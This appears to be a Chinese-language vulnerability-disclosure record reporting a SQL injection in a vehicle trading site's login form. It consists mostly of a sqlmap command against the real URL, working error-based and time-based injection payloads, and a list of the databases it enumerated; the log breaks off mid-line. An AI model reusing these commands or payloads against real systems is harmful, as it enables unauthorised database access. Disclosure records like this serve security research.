wybug_title: 商车网抓好你post sql注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-10-14：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-11-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  root@kali:~# sqlmap -u "http://www.cn357.com/login_1" --data "m=ajax&func=checkLogin&username=a'&userpwd=a" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151014}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 15:27:29[15:27:29] [WARNING] it appears that you have provided tainted parameter values ('username=a'') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properlyare you really sure that you want to continue (sqlmap could have problems)? [y/N] y[15:27:30] [INFO] resuming back-end DBMS 'mysql' [15:27:30] [INFO] testing connection to the target URL[15:27:30] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the testssqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: m=ajax&func=checkLogin&username=a' AND (SELECT 3265 FROM(SELECT COUNT(*),CONCAT(0x71707a7671,(SELECT (ELT(3265=3265,1))),0x716b6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- MrrW&userpwd=a    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 OR time-based blind    Payload: m=ajax&func=checkLogin&username=a' OR SLEEP(5)-- Mqpd&userpwd=a---[15:27:31] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.0[15:27:31] [INFO] fetching database names[15:27:31] [INFO] the SQL query used returns 3 entries[15:27:31] [INFO] resumed: information_schema[15:27:31] [INFO] resumed: mall[15:27:31] [INFO] resumed: scavailable databases [3]:[*] information_schema[*] mall[*] sc获得数据库-----------------------[15:28:22] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.0[15:28:22] [INFO]
